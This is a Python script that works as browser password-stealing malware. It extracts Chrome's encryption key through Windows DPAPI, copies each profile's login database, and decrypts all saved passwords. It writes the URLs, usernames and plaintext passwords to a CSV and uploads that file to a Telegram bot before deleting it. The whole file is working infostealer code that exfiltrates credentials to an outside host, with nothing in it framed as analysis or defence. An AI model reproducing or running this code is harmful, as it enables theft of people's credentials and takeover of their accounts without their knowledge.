import os
import re
import json
import base64
import sqlite3
import requests
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
T_TOKEN = "TOKEN"
T_ID = 123456789
class Password:
    def __init__(self,id:int,url:str,username:str,password:str,user:str):
        self.id = id
        self.username = username
        self.password = password
        self.user = user
        self.url = url
    def get_dict(self) -> dict:
        return {
            'id':self.id,
            'url':self.url,
            'username':self.username,
            'password':self.password,
            'user':self.user
        }
    def __str__(self):
        return str(self.get_dict())

def get_secret_key(CHROME_PATH_LOCAL_STATE):
    #(1) Get secret key from chrome local state
    with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    #Remove suffix DPAPI
    secret_key = secret_key[5:] 
    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    return secret_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    #(3-a) Initialisation vector for AES decryption
    initialisation_vector = ciphertext[3:15]
    #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
    #Encrypted password is 192 bits
    encrypted_password = ciphertext[15:-16]
    #(4) Build the cipher to decrypt the ciphertext
    cipher = generate_cipher(secret_key, initialisation_vector)
    decrypted_pass = decrypt_payload(cipher, encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

def get_db_connection(chrome_path_login_db):
    shutil.copy2(chrome_path_login_db, "Loginvault.db") 
    return sqlite3.connect("Loginvault.db")

def run(path_of_chrome = r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']),
        Local_State_PATH:str = None) -> list[Password]:
    if Local_State_PATH:
        CHROME_PATH_LOCAL_STATE = os.path.normpath(Local_State_PATH)
    else:
        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\Local State"%path_of_chrome)
    CHROME_PATH = os.path.normpath(path_of_chrome)
    pws = []
    #Create Dataframe to store passwords
    #(1) Get secret key
    secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)
    #Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
    for folder in folders:
        #(2) Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
        conn = get_db_connection(chrome_path_login_db)
        if(secret_key and conn):
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(url!="" or username!="" or ciphertext!=""):
                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
                    #(4) Use AES algorithm to decrypt the password
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    pws.append(Password(index,url,username,decrypted_password,folder))
            #Close database connection
            cursor.close()
            conn.close()
            #Delete temp login db
            os.remove("Loginvault.db")
    return pws

def send_doc_upload(token:str,
                chat_id:int,
                doc_file_opened,
                caption:str = None):
    tmp = {
            "chat_id":int(chat_id)
        }
    if caption:
        tmp['caption'] = str(caption)
    return requests.post(
        'https://api.telegram.org/bot'+token+'/sendDocument', files={'document':doc_file_opened}, data=tmp).json()

def send_send_to_host(token:str = T_TOKEN,id:int = T_ID):
    response = {}
    
    try:
        print('Running...')
        file_name = os.environ.get('COMPUTERNAME') + '.csv'
        tmp = run()
        print('Creating file...')
        file = open(file_name,'a',newline='')
        print('Creating csv writer...')
        c = csv.writer(file)
        print('Writing first row...')
        c.writerow([
            "No",
            "User",
            "URL",
            "Username",
            "Password"])
        print('Writing all rows...')
        for i in tmp:
            c.writerow([
                i.id,
                i.user,
                i.url,
                i.username,
                i.password
                ])
        file.close()
        with open(file_name,'rb') as file2:
            print('Sending...')
            send_doc_upload(token,id,file2,json.dumps(response))
            print('DONE')
        os.remove(file_name)
    except Exception as e:
        response['Exception'] = str(e)
        print(":\n"+json.dumps(response))
